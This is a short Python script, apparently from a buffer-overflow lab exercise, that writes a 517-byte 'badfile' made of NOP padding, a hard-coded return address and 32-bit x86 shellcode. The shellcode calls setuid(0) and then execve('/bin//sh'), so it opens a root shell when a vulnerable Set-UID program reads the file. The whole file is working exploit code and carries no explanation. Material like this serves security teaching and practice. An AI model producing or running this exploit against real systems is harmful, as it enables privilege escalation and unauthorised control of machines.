#!/usr/bin/python3

import sys

shellcode =(
"\x31\xc0" 
"\x31\xdb" 
"\xb0\xd5" 
"\xcd\x80" 
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = chr(0x90)*(0x20+4)  + '\xa0\xeb\xff\xbf'
content += chr(0x90)*(517-len(content)) 
content = bytearray(map(ord,content))

# Put the shellcode at the end
start = 516-len(shellcode)
content[start:] = shellcode 

# Write the content to badfile
file = open("badfile", "wb")
file.write(content)
file.close()
